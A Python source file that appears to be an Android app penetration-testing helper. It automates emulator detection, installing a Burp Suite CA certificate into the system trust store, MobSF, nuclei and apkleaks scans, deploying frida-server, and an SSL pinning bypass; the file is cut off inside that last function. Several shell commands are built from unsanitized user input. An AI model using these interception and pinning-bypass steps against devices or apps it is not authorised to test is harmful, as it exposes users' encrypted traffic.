#!/usr/bin/env python3
import os
import subprocess
import platform
import socket
import re
import shutil
import lzma
import sys
import shlex
import ctypes
import time
from platform import system
import warnings
import requests
from colorama import Fore, Style
warnings.filterwarnings("ignore")

# External libraries
import frida
import json
import psutil
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Global variables
emulator_type = None
emulator_installation_path = None
adb_command = None
device_serial = None
target_app = None

def detect_emulator():
    """Detect whether Nox, Genymotion, or Android Studio emulator is running.
       When running on Android, this function is bypassed.
    """
    global emulator_type, emulator_installation_path
    if 'ANDROID_ARGUMENT' in os.environ:
        print(Fore.YELLOW + "⚠️ Running on Android device; emulator detection is disabled." + Style.RESET_ALL)
        emulator_type = None
        emulator_installation_path = None
        return None, None

    for process in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
        try:
            name = process.info.get('name')
            cmdline = process.info.get('cmdline', [])
            exe_path = process.info.get('exe', '')
            if not exe_path:
                continue
            if name and 'Nox.exe' in name:
                emulator_type = 'Nox'
                emulator_installation_path = os.path.dirname(exe_path)
                break
            elif name and 'player.exe' in name and any('Genymotion' in arg for arg in cmdline):
                emulator_type = 'Genymotion'
                emulator_installation_path = os.path.dirname(exe_path)
                break
            elif name and ("emulator" in name.lower() or "qemu-system" in name.lower()):
                emulator_type = 'AndroidStudio'
                emulator_installation_path = os.path.dirname(exe_path)
                break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return emulator_type, emulator_installation_path

def connect_nox_adb_ports(adb_cmd):
    """
    Automatically attempt to connect the local ADB to Nox 
    on localhost ports [62001, 62025, 62026].
    """
    ip = '127.0.0.1'
    ports = [62001, 62025, 62026]
    for port in ports:
        cmd = f'{adb_cmd} connect {ip}:{port}'
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(Fore.GREEN + f"✅ Attempted adb connect to {ip}:{port}. Output:" + Style.RESET_ALL)
                print(Fore.GREEN + result.stdout.strip() + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + f"⚠️ Could not connect to {ip}:{port}. Error:" + Style.RESET_ALL)
                print(Fore.YELLOW + result.stderr.strip() + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"❌ Exception connecting to Nox at {ip}:{port}: {str(e)}" + Style.RESET_ALL)

def get_adb_command(emulator_type, emulator_installation_path):
    """Return the adb command path based on the emulator type.
       On Android, return None.
    """
    if os.environ.get('ANDROID_ARGUMENT'):
        return None

    if emulator_type == 'Nox':
        adb_executable = 'nox_adb.exe'
        adb_command_path = os.path.join(emulator_installation_path, adb_executable)
        if os.path.exists(adb_command_path):
            return f'"{adb_command_path}"'
        else:
            print(Fore.RED + f"❌ {adb_executable} not found in {emulator_installation_path}." + Style.RESET_ALL)
            return 'adb'
    elif emulator_type == 'Genymotion':
        adb_executable = 'adb.exe'
        adb_command_path = os.path.join(emulator_installation_path, 'tools', adb_executable)
        if os.path.exists(adb_command_path):
            return f'"{adb_command_path}"'
        else:
            print(Fore.YELLOW + "⚠️ Genymotion adb not found. Using system adb." + Style.RESET_ALL)
            return 'adb'
    else:
        return 'adb'

def get_connected_devices(adb_command):
    """Retrieve a list of connected devices via adb. Returns an empty list on Android."""
    if adb_command is None:
        return []
    try:
        result = subprocess.run(f'{adb_command} devices', shell=True, capture_output=True, text=True, check=True)
        devices = []
        for line in result.stdout.strip().split('\n')[1:]:
            if line.strip():
                device_serial = line.split()[0]
                devices.append(device_serial)
        return devices
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"❌ Error executing adb: {e}" + Style.RESET_ALL)
        return []

def run_adb_command(command):
    """Run an adb command for the selected device."""
    global device_serial, adb_command
    if adb_command is None or not device_serial:
        print(Fore.RED + "❗ ADB command cannot run: either not on desktop or no device selected." + Style.RESET_ALL)
        return None
    full_command = f'{adb_command} -s {device_serial} {command}'
    try:
        result = subprocess.run(full_command, shell=True, text=True, capture_output=True, check=True)
        return result
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"❌ adb command failed: {e}" + Style.RESET_ALL)
        return None

def get_local_ipv4_addresses():
    """Retrieve local IPv4 addresses."""
    ip_dict = {}
    for iface_name, iface_addresses in psutil.net_if_addrs().items():
        for addr in iface_addresses:
            if addr.family == socket.AF_INET:
                ip_dict[iface_name] = addr.address
    return ip_dict

def try_download_certificate(ip, port):
    input_der_file = "cacert.der"
    output_file = "9a5ba575.0"

    if os.path.exists(output_file):
        print(Fore.GREEN + f"✅ Found local certificate '{output_file}', skipping remote download." + Style.RESET_ALL)
    else:
        cert_url = f"http://{ip}:{port}/cert"
        try:
            response = requests.get(cert_url, timeout=10)
            if response.status_code == 200:
                with open(input_der_file, "wb") as certificate_file:
                    certificate_file.write(response.content)
                print(Fore.GREEN + f"✅ Certificate downloaded successfully from {cert_url}." + Style.RESET_ALL)
                os.rename(input_der_file, output_file)
                print(Fore.GREEN + f"✅ Renamed {input_der_file} to {output_file}." + Style.RESET_ALL)
            else:
                print(Fore.RED + f"❌ Unable to download the certificate from {cert_url}. Status code: {response.status_code}" + Style.RESET_ALL)
                return False
        except ConnectionError:
            print(Fore.RED + f"❌ Burp Suite is not running or the proxy is not available at {ip}:{port}." + Style.RESET_ALL)
            return False
        except Exception as e:
            print(Fore.RED + f"❌ An unexpected error occurred during download: {str(e)}" + Style.RESET_ALL)
            return False

    push_result = run_adb_command(f'push {output_file} /system/etc/security/cacerts/')
    if push_result is None or (push_result.stderr and "read-only" in push_result.stderr.lower()):
        print(Fore.YELLOW + "⚠️ Error: File system is read-only. Retrying with adb root and remount." + Style.RESET_ALL)
        result_root = run_adb_command('root')
        if result_root is None:
            print(Fore.RED + "❌ Unable to obtain root privileges via adb." + Style.RESET_ALL)
            return False
        time.sleep(5)
        result_remount = run_adb_command('remount')
        if result_remount is None:
            print(Fore.RED + "❌ Unable to remount the partition as writable." + Style.RESET_ALL)
            return False
        push_result = run_adb_command(f'push {output_file} /system/etc/security/cacerts/')
        if push_result is None or (push_result.stderr and "read-only" in push_result.stderr.lower()):
            print(Fore.RED + "❌ The partition is still read-only." + Style.RESET_ALL)
            user_choice = input(Fore.YELLOW + "Would you like to reboot the device now? (y/n): " + Style.RESET_ALL).strip().lower()
            if user_choice in ['y', 'yes']:
                reboot_result = run_adb_command('reboot')
                if reboot_result is None:
                    print(Fore.RED + "❌ Failed to reboot the device. Please reboot manually." + Style.RESET_ALL)
                else:
                    print(Fore.GREEN + "✅ Device reboot initiated. Please try installing the certificate again after the device restarts." + Style.RESET_ALL)
                return False
            else:
                print(Fore.RED + "❌ Certificate installation failed due to read-only partition." + Style.RESET_ALL)
                return False

    chmod_result = run_adb_command(f'shell chmod 644 /system/etc/security/cacerts/{output_file}')
    if chmod_result is None:
        print(Fore.RED + "❌ Failed to set permissions on the certificate." + Style.RESET_ALL)
        return False

    print(Fore.GREEN + "✅ Burp Suite certificate installed successfully on the device." + Style.RESET_ALL)
    try:
        os.remove(output_file)
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Unable to remove local file {output_file}: {str(e)}" + Style.RESET_ALL)
    return True

def install_burpsuite_certificate(port):
    """Install the Burp Suite certificate onto the device using the provided IP and port."""
    ip = input(Fore.CYAN + "📝 Enter the IP (e.g., 127.0.0.1): " + Style.RESET_ALL).strip()
    if not ip:
        print(Fore.RED + "❌ Invalid IP." + Style.RESET_ALL)
        return
    print(Fore.CYAN + f"🔍 Attempting to download the certificate from {ip}:{port}..." + Style.RESET_ALL)
    if try_download_certificate(ip, port):
        print(Fore.GREEN + "✅ Certificate installation completed." + Style.RESET_ALL)
    else:
        print(Fore.RED + "❌ Certificate installation failed." + Style.RESET_ALL)

def run_android_studio_emulator():
    try:
        username = os.getlogin()
        emulator_dir = os.path.join("C:\\Users", username, "AppData", "Local", "Android", "Sdk", "emulator")
        emulator_exe = os.path.join(emulator_dir, "emulator.exe")
        if not os.path.exists(emulator_exe):
            print(Fore.RED + f"❌ Emulator not found in {emulator_dir}" + Style.RESET_ALL)
            return
        list_command = f'"{emulator_exe}" -list-avds'
        output = subprocess.check_output(list_command, shell=True, universal_newlines=True)
        avds = [line.strip() for line in output.strip().splitlines() if line.strip()]
        if not avds:
            print(Fore.RED + "❌ No AVD found." + Style.RESET_ALL)
            return
        print(Fore.GREEN + "Available AVDs:" + Style.RESET_ALL)
        for idx, avd in enumerate(avds, 1):
            print(f"{idx}. {avd}")
        choice = input(Fore.CYAN + "Enter the number of the AVD to launch: " + Style.RESET_ALL).strip()
        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(avds):
            print(Fore.RED + "❌ Invalid selection." + Style.RESET_ALL)
            return
        selected_avd = avds[int(choice) - 1]
        launch_command = f'cd /d "{emulator_dir}" && emulator.exe -avd {selected_avd} -no-snapshot -writable-system'
        print(Fore.CYAN + f"Launching emulator in background: {launch_command}" + Style.RESET_ALL)
        if platform.system() == "Windows":
            subprocess.Popen(launch_command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen(launch_command, shell=True)
    except Exception as e:
        print(Fore.RED + f"❌ Error launching emulator: {e}" + Style.RESET_ALL)

def get_emulator_ip():
    """Retrieve emulator's IP address."""
    if not device_serial:
        print(Fore.RED + "❗ No device selected. Cannot get emulator IP." + Style.RESET_ALL)
        return None
    result = run_adb_command('shell getprop dhcp.eth0.ipaddress')
    if result and result.stdout.strip():
        ip_address = result.stdout.strip()
        print(Fore.GREEN + f"✅ Emulator IP Address: {ip_address}" + Style.RESET_ALL)
        return ip_address
    else:
        result = run_adb_command('shell ip -f inet addr show eth0')
        if result and result.stdout.strip():
            match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result.stdout)
            if match:
                ip_address = match.group(1)
                print(Fore.GREEN + f"✅ Emulator IP Address: {ip_address}" + Style.RESET_ALL)
                return ip_address
    print(Fore.RED + "❗ Could not get emulator IP address." + Style.RESET_ALL)
    return None

def run_command_in_background(cmd):
    """Run a command in the background."""
    if platform.system() == "Windows":
        subprocess.Popen(f'start /B {cmd}', shell=True)
    else:
        subprocess.Popen(f'{cmd} &', shell=True)

def open_new_terminal(cmd):
    """Open a new terminal and execute the given command.
       On Android, simply prints the command.
    """
    if os.environ.get('ANDROID_ARGUMENT'):
        print(Fore.YELLOW + "⚠️ open_new_terminal is not supported on Android. Run this command manually:" + Style.RESET_ALL)
        print(Fore.YELLOW + cmd + Style.RESET_ALL)
        return
    try:
        if platform.system() == "Windows":
            subprocess.Popen(f'start cmd /k "{cmd}"', shell=True)
        elif platform.system() == "Darwin":
            apple_script = f'''
            tell application "Terminal"
                do script "{cmd}"
                activate
            end tell
            '''
            subprocess.Popen(['osascript', '-e', apple_script])
        else:
            terminal_emulators = ['gnome-terminal', 'konsole', 'xterm', 'lxterminal', 'xfce4-terminal', 'mate-terminal', 'terminator', 'urxvt']
            for term in terminal_emulators:
                if shutil.which(term):
                    subprocess.Popen([term, '-e', cmd])
                    break
            else:
                print(Fore.RED + "❌ No supported terminal emulator found. Run this command manually:" + Style.RESET_ALL)
                print(Fore.YELLOW + cmd + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"❌ Failed to open a new terminal: {e}" + Style.RESET_ALL)

# ============================================================
#  Red Team / Mobile Security Functions (MobSF, nuclei, apkleaks, Frida, Drozer, etc.)
# ============================================================

def run_mobsf():
    global emulator_type, device_serial, adb_command

    if not shutil.which("docker"):
        print(Fore.RED + "❌ Docker is not installed or not in the PATH." + Style.RESET_ALL)
        return

    print("\n" + "=" * 50)
    print(f"{Fore.MAGENTA}=== MobSF Setup ==={Style.RESET_ALL}")
    print("=" * 50)

    print(f"\n{Fore.CYAN}Do you want to connect MobSF to an emulator?{Style.RESET_ALL}")
    devices = get_connected_devices(adb_command)
    if devices:
        default_emulator = "emulator-5554" if "emulator-5554" in devices else devices[0]
        print(f"1. Use detected emulator ({default_emulator})")
    else:
        print("No emulator running detected.")

    print("2. Specify a custom device ID (e.g., emulator-5554 or adb_ip:adb_port)")
    print("3. Do not use any emulator")
    emu_choice = input("Enter your choice (1/2/3): ").strip()

    if emu_choice == "1":
        if devices:
            if len(devices) == 1:
                device_serial = devices[0]
            else:
                device_serial = default_emulator
                print(f"\n{Fore.GREEN}Detected devices:{Style.RESET_ALL}")
                for idx, dev in enumerate(devices, 1):
                    print(f"  {idx}. {dev}")
                use_default = input(f"Default '{default_emulator}' will be used. Do you want to use it? (y/n): ").strip().lower()
                if use_default not in ["y", "yes"]:
                    try:
                        choice = int(input("Enter the number of the device you want to use: ").strip())
                        device_serial = devices[choice - 1]
                    except Exception:
                        print(Fore.RED + "❌ Invalid choice. Aborting." + Style.RESET_ALL)
                        return
        else:
            print(Fore.RED + "❌ No detected emulator. Please choose option 2 or 3." + Style.RESET_ALL)
            return
    elif emu_choice == "2":
        custom_id = input("Enter the custom device ID (e.g., emulator-5554): ").strip()
        if custom_id:
            device_serial = custom_id
        else:
            print(Fore.RED + "❌ Invalid device ID. Aborting." + Style.RESET_ALL)
            return
    elif emu_choice == "3":
        device_serial = None
        print(Fore.GREEN + "Proceeding without connecting to an emulator." + Style.RESET_ALL)
    else:
        print(Fore.RED + "❌ Invalid choice. Aborting." + Style.RESET_ALL)
        return

    custom_proxy_choice = input(f"\n{Fore.CYAN}Do you want to use a custom proxy for MobSF? (y/n): {Style.RESET_ALL}").strip().lower()
    if custom_proxy_choice in ["y", "yes"]:
        print("\n" + Fore.GREEN + "===== Local IP Addresses =====" + Style.RESET_ALL)
        ip_dict = get_local_ipv4_addresses()
        header = f"{'Interface':<30} {'IP Address':<20}"
        print(header)
        print("-" * len(header))
        for iface, ip_addr in ip_dict.items():
            print(f"{iface:<30} {ip_addr:<20}")
        user_ip = input(f"\n{Fore.CYAN}Enter the proxy IP (e.g., 192.168.0.100): {Style.RESET_ALL}").strip()
        user_port = input(f"{Fore.CYAN}Enter the proxy port (e.g., 8080): {Style.RESET_ALL}").strip()
        if not user_ip or not user_port.isdigit():
            print(Fore.RED + "❌ Invalid proxy IP or port. Aborting configuration." + Style.RESET_ALL)
            return
        use_proxy = True
        if device_serial:
            proxy_type = input(f"{Fore.CYAN}Configure global proxy on emulator as 'http' or 'https'? (default: http): {Style.RESET_ALL}").strip().lower()
            if proxy_type not in ["http", "https"]:
                proxy_type = "http"
    else:
        use_proxy = False

    print(f"\n{Fore.YELLOW}Checking for existing 'mobsf' container...{Style.RESET_ALL}")
    # Check if the 'mobsf' container exists
    result = subprocess.run('docker ps -a --filter name=^/mobsf$ --format "{{.Status}}"', shell=True, capture_output=True, text=True)
    container_status = result.stdout.strip()

    if container_status:
        if container_status.lower().startswith("up"):
            print(Fore.GREEN + "✅ 'mobsf' container is already running." + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "⚠️ 'mobsf' container exists but is not running. Starting it..." + Style.RESET_ALL)
            subprocess.run("docker start mobsf", shell=True)
            print(Fore.GREEN + "✅ 'mobsf' container started." + Style.RESET_ALL)
    else:
        docker_cmd = 'docker run -it --name mobsf -p 8000:8000 -p 1337:1337 '
        if device_serial:
            docker_cmd += f'-e MOBSF_ANALYZER_IDENTIFIER="{device_serial}" '
        if use_proxy:
            docker_cmd += f'-e MOBSF_PROXY_IP="{user_ip}" -e MOBSF_PROXY_PORT="{user_port}" '
        docker_cmd += 'opensecurity/mobile-security-framework-mobsf:latest'

        print(f"\n{Fore.CYAN}Launching MobSF container with the following command:{Style.RESET_ALL}")
        print(docker_cmd)
        open_new_terminal(docker_cmd)

    if device_serial and use_proxy:
        settings_key = "http_proxy" if proxy_type == "http" else "https_proxy"
        adb_cmd = f'adb -s {device_serial} shell settings put global {settings_key} {user_ip}:{user_port}'
        try:
            subprocess.run(adb_cmd, shell=True, check=True)
            print(Fore.GREEN + f"✅ Global {settings_key} set to {user_ip}:{user_port} on emulator {device_serial}." + Style.RESET_ALL)
        except subprocess.CalledProcessError as e:
            print(Fore.RED + f"❌ Failed to set global {settings_key} on emulator. Error: {e}" + Style.RESET_ALL)

    print(Fore.GREEN + "\n✅ Setup complete! The MobSF container is starting in a separate window." + Style.RESET_ALL)

def run_nuclei_against_apk():
    while True:
        apk_path_input = input("Enter the path to the APK file: ").strip()
        apk_path = apk_path_input.strip("'").strip('"')
        if os.path.exists(apk_path):
            break
        else:
            print(f"Error: The file {apk_path_input} does not exist.")

    script_dir = os.getcwd()
    output_dir = os.path.join(script_dir, os.path.splitext(os.path.basename(apk_path))[0])
    
    if os.path.exists(output_dir):
        print(f"\n⚠️ The directory \"{output_dir}\" already exists.")
        print("What would you like to do?")
        print("1. Scan directly using the existing Apktool output")
        print("2. Overwrite the output with a fresh decompilation")
        action_choice = input("\nEnter your choice (1 or 2): ").strip()
        if action_choice not in ['1', '2']:
            print("\n❌ Invalid choice. Operation cancelled.\n")
            return
        if action_choice == '2':
            shutil.rmtree(output_dir)

    apktool_command = "apktool" if system().lower() != "windows" else "apktool.bat"
    try:
        subprocess.run(shlex.split(f"{apktool_command} d \"{apk_path}\" -o \"{output_dir}\""), check=True)
    except subprocess.CalledProcessError as e:
        print(f"\n❌ Error: Failed to decompile APK. {e}\n")
        return
    except FileNotFoundError as e:
        print(f"\n❌ Error: {e}. Ensure apktool is installed and accessible.")
        return

    user_home = os.path.expanduser("~")
    android_template_path = os.path.join(user_home, "nuclei-templates", "file", "android")
    keys_template_path = os.path.join(user_home, "nuclei-templates", "file", "keys")

    print("\nPlease choose which templates to use:")
    print("1. Android Templates")
    print("2. Keys Templates")
    print("3. Both (Android + Keys)")
    print("4. Custom Templates (provide your own template path)")
    template_choice = input("Enter the number of your choice: ").strip()
    templates_paths = []

    if template_choice == '1':
        templates_paths.append(android_template_path)
    elif template_choice == '2':
        templates_paths.append(keys_template_path)
    elif template_choice == '3':
        templates_paths.extend([android_template_path, keys_template_path])
    elif template_choice == '4':
        custom_path = input("Enter the full path to your nuclei templates: ").strip()
        custom_path = custom_path.strip("'").strip('"')
        templates_paths.append(custom_path)
    else:
        print("Invalid choice. Exiting.")
        return

    for path in templates_paths:
        if not os.path.exists(path):
            print(f"Templates directory not found at {path}.")
            return

    nuclei_command = ["nuclei", "-target", output_dir, "-file"]
    for template_path in templates_paths:
        nuclei_command.extend(["-t", template_path])
    
    print("Nuclei command:", nuclei_command)
    try:
        result = subprocess.run(nuclei_command, check=True, capture_output=True, text=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to run nuclei. {e}")
        print(f"Stderr: {e.stderr}")
        return

    save_output = input("Do you want to save the output? (y/n): ").strip().lower()
    if save_output in ['y', 'yes']:
        output_file = os.path.join(script_dir, f"{os.path.splitext(os.path.basename(output_dir))[0]}_nuclei_output.txt")
        with open(output_file, "w") as file:
            file.write(result.stdout)
        print(f"Output saved to {output_file}")
    print("Analysis complete.")

def is_go_installed():
    try:
        subprocess.run(["go", "version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def run_apkleaks():
    try:
        subprocess.run(['apkleaks', '-h'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(Fore.RED + "❌ apkleaks is not installed or not found in your PATH. Please install it using 'pip install apkleaks'." + Style.RESET_ALL)
        return

    apk_path_input = input("📝 Enter the path to the APK file: ").strip()
    apk_path = apk_path_input.replace('"', '').replace("'", '')
    apk_path = os.path.normpath(apk_path)

    if not os.path.isfile(apk_path):
        print(Fore.RED + f"❌ Error: The file '{apk_path}' does not exist or is not valid." + Style.RESET_ALL)
        return

    print(Fore.CYAN + f"\n🔍 Running apkleaks on '{apk_path}'..." + Style.RESET_ALL)
    try:
        output_filename = f"{os.path.splitext(os.path.basename(apk_path))[0]}_apkleaks_output.txt"
        output_path = os.path.join(os.getcwd(), output_filename)
        command = ['apkleaks', '-f', apk_path, '-o', output_path]
        result = subprocess.run(command, check=True, capture_output=True, text=True)
        print(Fore.GREEN + f"✅ apkleaks output saved to '{output_path}'." + Style.RESET_ALL)
        print(Fore.GREEN + f"📄 Output:\n{result.stdout}" + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"❌ Error running apkleaks: {e.stderr}" + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + "❌ apkleaks is not installed. Please install it using 'pip install apkleaks'." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"❌ An unexpected error occurred: {str(e)}" + Style.RESET_ALL)

def is_frida_server_running():
    global adb_command, device_serial
    if adb_command is None or not device_serial:
        return False
    try:
        result = subprocess.run(f'{adb_command} -s {device_serial} shell pgrep -f frida-server',
                                shell=True, capture_output=True, text=True)
        if result.stdout.strip():
            return True
        else:
            return False
    except Exception:
        return False

def install_frida_server():
    global adb_command, device_serial
    if adb_command is None or not device_serial:
        print(Fore.RED + "❌ ADB command unavailable or no device selected. Cannot install Frida-Server." + Style.RESET_ALL)
        return

    if is_frida_server_running():
        print(Fore.GREEN + "✅ Frida-Server is already running on the device." + Style.RESET_ALL)
        return

    try:
        frida_version_output = subprocess.check_output("frida --version", shell=True, stderr=subprocess.STDOUT, text=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(Fore.RED + "❌ Frida Tools is not installed on this system. Please install Frida Tools first." + Style.RESET_ALL)
        return

    version_match = re.search(r'(\d+\.\d+\.\d+)', frida_version_output)
    if not version_match:
        print(Fore.RED + "❌ Unable to determine Frida Tools version." + Style.RESET_ALL)
        return
    frida_version = version_match.group(1)
    print(Fore.GREEN + f"✅ Frida-Tools Version: {frida_version}" + Style.RESET_ALL)

    arch_result = run_adb_command('shell getprop ro.product.cpu.abi')
    if arch_result and arch_result.stdout.strip():
        emulator_arch = arch_result.stdout.strip()
        print(Fore.GREEN + f"✅ Device CPU Architecture: {emulator_arch}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "❌ Unable to determine device CPU architecture." + Style.RESET_ALL)
        return

    frida_server_url = f"https://github.com/frida/frida/releases/download/{frida_version}/frida-server-{frida_version}-android-{emulator_arch}.xz"
    print(Fore.CYAN + f"🔗 Downloading Frida-Server from: {frida_server_url}" + Style.RESET_ALL)

    try:
        response = requests.get(frida_server_url, stream=True, timeout=15)
        response.raise_for_status()
        with open("frida-server.xz", "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(Fore.GREEN + "✅ Frida-Server downloaded successfully." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"❌ Failed to download Frida-Server: {e}" + Style.RESET_ALL)
        return

    try:
        with lzma.open("frida-server.xz") as compressed_file:
            with open("frida-server", "wb") as out_file:
                shutil.copyfileobj(compressed_file, out_file)
        os.remove("frida-server.xz")
        print(Fore.GREEN + "✅ Frida-Server decompressed successfully." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"❌ Failed to decompress Frida-Server: {e}" + Style.RESET_ALL)
        return

    try:
        print(Fore.CYAN + "🔧 Setting device to root mode and remounting system partition..." + Style.RESET_ALL)
        subprocess.run(f'{adb_command} -s {device_serial} root', shell=True, check=True)
        time.sleep(2)
        subprocess.run(f'{adb_command} -s {device_serial} remount', shell=True, check=True)
        print(Fore.GREEN + "✅ Device is in root mode and system partition is remounted." + Style.RESET_ALL)

        print(Fore.CYAN + "📦 Pushing Frida-Server to /data/local/tmp/..." + Style.RESET_ALL)
        subprocess.run(f'{adb_command} -s {device_serial} push frida-server /data/local/tmp/', shell=True, check=True)
        print(Fore.GREEN + "✅ Frida-Server pushed successfully." + Style.RESET_ALL)

        print(Fore.CYAN + "🔧 Setting executable permissions on Frida-Server..." + Style.RESET_ALL)
        subprocess.run(f'{adb_command} -s {device_serial} shell "chmod 755 /data/local/tmp/frida-server"', shell=True, check=True)
        print(Fore.GREEN + "✅ Permissions set: Frida-Server is ready." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"❌ Error during Frida-Server installation: {e}" + Style.RESET_ALL)
        return

    try:
        os.remove("frida-server")
    except Exception:
        pass

def run_frida_server():
    global adb_command, device_serial
    if adb_command is None or not device_serial:
        print(Fore.RED + "❌ ADB command cannot run: either not on desktop or no device selected." + Style.RESET_ALL)
        return
    if is_frida_server_running():
        print(Fore.YELLOW + "⚠️ Frida-Server is already running." + Style.RESET_ALL)
        return
    command = f'shell "/data/local/tmp/frida-server &"'
    full_command = f'{adb_command} -s {device_serial} {command}'
    try:
        subprocess.Popen(full_command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(1)
        if is_frida_server_running():
            print(Fore.GREEN + "✅ Frida-Server started." + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "⚠️ Frida-Server may not have started properly." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"❌ Failed to start Frida-Server: {e}" + Style.RESET_ALL)

def list_installed_applications():
    """List installed applications on the emulator using Frida."""
    if not is_frida_server_running():
        print(Fore.YELLOW + "⚠️ Frida-Server is not running. Attempting to start it..." + Style.RESET_ALL)
        run_frida_server()
        if not is_frida_server_running():
            print(Fore.RED + "❌ Frida-Server is not running. Cannot list applications." + Style.RESET_ALL)
            return
    print(Fore.CYAN + "📜 Listing installed applications on the emulator..." + Style.RESET_ALL)
    try:
        result = subprocess.run(['frida-ps', '-Uai'], capture_output=True, text=True, check=True)
        print(Fore.GREEN + result.stdout + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"❌ Error listing applications: {e}" + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + "❌ Frida is not installed or not found in your PATH. Please install Frida." + Style.RESET_ALL)

# ============================================================
#  New Target Selection Functions (using ADB)
# ============================================================

def list_relevant_apps(include_system_apps=False):
    """
    Uses ADB to list running processes and returns only those that look like app package names.
    It runs "adb shell ps" on the selected device and filters for process names that contain a dot.
    By default, it filters out common system apps to reduce noise.
    
    Args:
        include_system_apps (bool): If True, include system apps in the results.
    """
    global adb_command, device_serial
    if adb_command is None or not device_serial:
        print(Fore.RED + "❌ ADB command unavailable or no device selected." + Style.RESET_ALL)
        return []
    
    try:
        cmd = f'{adb_command} -s {device_serial} shell ps'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"❌ Error executing adb shell ps: {e}" + Style.RESET_ALL)
        return []
    
    lines = result.stdout.splitlines()
    if not lines:
        print(Fore.YELLOW + "⚠️ No processes found." + Style.RESET_ALL)
        return []
    
    # Common system app prefixes to filter out
    system_app_prefixes = [
        "com.android.",
        "com.google.",
        "android.",
        "system.",
        "com.sec.",  # Samsung
        "com.xiaomi.",  # Xiaomi
        "com.huawei.",  # Huawei
        "com.oppo.",    # OPPO
        "com.vivo.",    # Vivo
        "com.oneplus."  # OnePlus
    ]
    
    apps = []
    # Skip header and assume the last column is the process name.
    for line in lines[1:]:
        parts = line.split()
        if parts:
            process_name = parts[-1]
            if '.' in process_name and process_name not in apps:
                # Filter out system apps if include_system_apps is False
                if include_system_apps or not any(process_name.startswith(prefix) for prefix in system_app_prefixes):
                    apps.append(process_name)
    
    return apps

def set_target_app():
    """
    Lists running applications (using ADB) and lets the user select one as the target.
    The selected package name is saved in the global variable `target_app`.
    """
    global target_app
    
    # First try without system apps
    apps = list_relevant_apps(include_system_apps=False)
    
    if not apps:
        print(Fore.YELLOW + "⚠️ No relevant running applications found." + Style.RESET_ALL)
        include_system = input(Fore.CYAN + "Would you like to include system apps? (y/n): " + Style.RESET_ALL).strip().lower()
        if include_system in ['y', 'yes']:
            apps = list_relevant_apps(include_system_apps=True)
            if not apps:
                print(Fore.RED + "❌ No applications found even with system apps included." + Style.RESET_ALL)
                return
        else:
            return

    print("\n" + Fore.CYAN + "Select a target application from the list:" + Style.RESET_ALL)
    for idx, app in enumerate(apps, 1):
        print(f"{idx}. {app}")
    
    print(f"{len(apps) + 1}. Enter package name manually")

    choice = input(Fore.CYAN + "Enter the number of your target app: " + Style.RESET_ALL).strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(apps) + 1:
        print(Fore.RED + "❌ Invalid choice. Target not set." + Style.RESET_ALL)
        return
    
    if int(choice) == len(apps) + 1:
        # Manual entry option
        manual_package = input(Fore.CYAN + "Enter the package name manually: " + Style.RESET_ALL).strip()
        if not manual_package or '.' not in manual_package:
            print(Fore.RED + "❌ Invalid package name. Target not set." + Style.RESET_ALL)
            return
        target_app = manual_package
    else:
        target_app = apps[int(choice) - 1]
    
    print(Fore.GREEN + f"✅ Target set to: {target_app}" + Style.RESET_ALL)

# ============================================================
#  Frida functions modified to use the global target (if set)
# ============================================================

def run_ssl_pinning_bypass():
    """
    Run SSL Pinning Bypass using Frida.
    If a target application has been set using the global variable `target_app`,
    that package is used automatically. Otherwise, the list of running apps is displayed for selection.
    """
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'frida-scripts', 'ssl-pinning-bypass.js')
    if not os.path.exists(script_path):
        print(Fore.RED + f"❌ Script not found at {script_path}. Ensure the script is in the 'frida-scripts' directory." + Style.RESET_ALL)
        return
    if not is_frida_server_running():
        print(Fore.YELLOW + "⚠️ Frida-Server is not running. Attempting to start it..." + Style.RESET_ALL)
        run_frida_server()
        if not is_frida_server_running():
            print(Fore.RED + "❌ Frida-Server is not running. Cannot proceed with SSL Pinning Bypass." + Style.RESET_ALL)
            return

    global target_app
    if not target_app:
        print(Fore.YELLOW + "No target set. Please select a target application:" + Style.RESET_ALL)
        set_target_app()
        if not target_app:
            print(Fore.RED + "No target set. Aborting operation." + Style.RESET_ALL)
            return
    app_package = target_app
